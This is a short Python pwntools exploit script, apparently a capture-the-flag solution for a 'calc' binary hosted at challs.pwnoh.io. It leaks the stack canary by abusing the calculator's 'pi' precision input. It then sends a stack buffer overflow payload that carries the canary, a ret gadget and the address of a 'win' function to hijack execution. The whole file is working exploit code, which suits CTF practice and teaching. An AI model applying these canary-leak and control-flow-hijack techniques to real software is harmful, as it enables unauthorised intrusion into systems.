from pwn import *
from icecream import ic

elf = exe = ELF("./calc")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("challs.pwnoh.io", 13377)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *0x000000000040148c
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def gad(a, b): return ROP(a).find_gadget([f"pop {b}", "ret"])[0]
def i(): return io.interactive()

io = start()

sl(b'pi')
sl(str(0x271e).encode())
sl(b'+')
sl(b'0')

ru("\x00\x00\x00\x00\x00\x00\x00")
canary = u64(re(8))
ic(hex(canary))

ret = 0x000000000040101a
payload = flat(
    'a' * 40,
    canary,
    'b' * 8,
    ret,
    elf.sym['win']
)
sl(payload)
io.interactive()
